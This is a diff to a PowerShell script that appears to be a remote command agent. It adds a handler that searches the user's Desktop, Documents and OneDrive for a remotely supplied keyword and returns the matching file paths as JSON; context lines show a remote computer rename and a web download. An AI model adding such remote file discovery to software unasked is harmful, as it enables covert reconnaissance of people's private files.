@@ -318,6 +318,20 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData('
                                 $newName = $cmd.payload.newName
                                 Rename-Computer -NewName $newName -Force
                                 $Result = "Computer renamed to $newName (Restart Required)"
+                            } elseif ($cmd.type -eq "LocalSearch") {
+                                $kw = $cmd.payload.keyword
+                                Log-Message "LOCAL SEARCH START: $kw"
+                                $paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
+                                if ($env:OneDrive) { $paths += $env:OneDrive }
+                                
+                                $files = foreach ($p in $paths) {
+                                    if (Test-Path $p) {
+                                        Get-ChildItem -Path $p -Filter "*$kw*" -Recurse -File -ErrorAction SilentlyContinue | 
+                                            Select-Object Name, FullName, @{Name="Size";Expression={$_.Length}}, LastWriteTime
+                                    }
+                                }
+                                $Result = $files | ConvertTo-Json
+                                Log-Message "LOCAL SEARCH END: Found $($files.Count) items."
                             }
                             
                             Log-Message "Result captured ($($Result.Length) chars)"
